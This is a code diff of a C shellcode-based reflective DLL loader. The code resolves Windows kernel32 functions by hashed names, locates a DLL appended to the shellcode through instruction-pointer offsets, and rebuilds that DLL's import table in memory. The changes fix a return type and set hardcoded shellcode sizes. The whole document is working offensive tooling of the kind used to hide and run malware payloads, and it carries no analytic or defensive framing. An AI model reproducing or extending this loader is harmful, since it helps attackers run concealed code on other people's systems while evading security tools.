@@ -26,7 +26,9 @@ typedef BOOL(WINAPI* _VirtualProtect)(
 	_In_ DWORD flNewProtect,
 	_Out_ PDWORD lpflOldProtect);
 
-typedef INT(WINAPI* _GetProcAddress)(
+// Lmao, chatgpt said it was returning INT, which fucked up the type of the return
+// value and hence the function address in x64. Lesson learnt: never trust chatgpt
+typedef FARPROC(WINAPI* _GetProcAddress)(
 	_In_ HMODULE hModule,
 	_In_ LPCSTR  lpProcName);
 
@@ -118,27 +120,23 @@ inline void optimized_memcpy(void* dest, const void* src, size_t n) {
 	}
 }
 
-#define BYTE_OFFSET_AS(type, ptr, count) (type)((BYTE*)(ptr) + (count))
+#define BYTE_OFFSET_AS(type, ptr, count) (type)((BYTE*)(ptr) + (size_t)(count))
 
 int main() {
 	// Get the concatenated dll pointer by adding an offset to the current instruction pointer value
 	const void* currentAddressPointer = CurrentAddress();
 
-	// If O1 optimizations are ON,
-	// DLL offset should be: sizeof(this entire shellcode) - 0xA
-	// If O1 optimizations are OFF,
-	// DLL offset should be: sizeof(this entire shellcode) - 0xE
-	// (0xE comes from the instructions until setting the currentAddressPointer, in debug)
-	// When .text section size is 4096 B: kDllOffset should be 0xff2
-	//							  3584 B:					   0xdf2
-	//							  3072 B:					   0xbf2
-	// And so on...
-
-	// For x64 need to take into account the injected stack aligning assembly,
+	// The correct DLL offset is: 
+	// sizeof(this entire shellcode) - (byte offset until the first call after CurrentAddress)
+	// For x64, we need to take into account the injected stack aligning assembly,
 	// which is 0x16 (22) bytes long
+	// To figure out the correct offset, inspect the assembly generated and 
+	// count the bytes from the beginning of the shellcode until the first call
+	// _after_ call CurrentAddress
+
 #ifdef WIN64
 	#ifdef OPTIMIZE
-		const unsigned int currentInstructionPointerOffset = 0x0;
+		const unsigned int currentInstructionPointerOffset = 0x2f;
 	#else
 		const unsigned int currentInstructionPointerOffset = 0x24;
 	#endif
@@ -152,12 +150,12 @@ int main() {
 
 #ifdef WIN64
 	#ifdef OPTIMIZE
-		const unsigned int kShellcodeLength = 0x0;
+		const unsigned int kShellcodeLength = 0x800;
 	#else
 		#ifdef DEBUG_PRINT
-			const unsigned int kShellcodeLength = 0x1800;
+			const unsigned int kShellcodeLength = 0x1a00;
 		#else
-			const unsigned int kShellcodeLength = 0x0;
+			const unsigned int kShellcodeLength = 0x1000;
 		#endif
 	#endif
 	
@@ -176,8 +174,6 @@ int main() {
 	const unsigned int kDllOffset = kShellcodeLength - currentInstructionPointerOffset;
 	const void* concatDllBytesPtr
 		= BYTE_OFFSET_AS(const void*, currentAddressPointer, kDllOffset);
-	//const void* concatenatedDllBytesPtr 
-	//	= ReadFileIntoMemory("C:\\Users\\frane\\Documents\\code\\Reflective\\out\\bin\\x64\\Release\\DummyDLL.dll");
 
 	// kernel32.dll
 	void* module = GetModuleByHash(0x7040ee75);
@@ -191,8 +187,6 @@ int main() {
 	DefineImportedFuncPtrByHash(module, VirtualAlloc, 0x382c0f97);
 	DefineImportedFuncPtrByHash(module, VirtualFree, 0x668fcf2e);
 	DefineImportedFuncPtrByHash(module, VirtualProtect, 0x844ff18d);
-	//DefineImportedFuncPtrByHash(module, GetCurrentProcess, 0xca8d7527);
-	//DefineImportedFuncPtrByHash(module, ReadProcessMemory, 0xb8932459);
 	DefineImportedFuncPtrByHash(module, GetProcAddress, 0xcf31bb1f);
 
 	// Get pointers to in-memory DLL headers
@@ -320,13 +314,14 @@ int main() {
 			while (thunk->u1.AddressOfData != NULL) {
 				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
 					LPCSTR functionOrdinal = (LPCSTR)(IMAGE_ORDINAL(thunk->u1.Ordinal));
-					thunk->u1.Function = (DWORD_PTR)(GetProcAddressFuncPtr(hLibrary, functionOrdinal));
+					thunk->u1.Function = (DWORD_PTR)(GetProcAddressFuncPtr(hLibrary, functionOrdinal)); 
 				}
 				else {
 					const PIMAGE_IMPORT_BY_NAME functionName 
 						= BYTE_OFFSET_AS(PIMAGE_IMPORT_BY_NAME, dllBasePointer, thunk->u1.AddressOfData);
 					const DWORD_PTR functionAddress 
 						= (DWORD_PTR)(GetProcAddressFuncPtr(hLibrary, functionName->Name));
+
 					thunk->u1.Function = functionAddress;
 				}
 
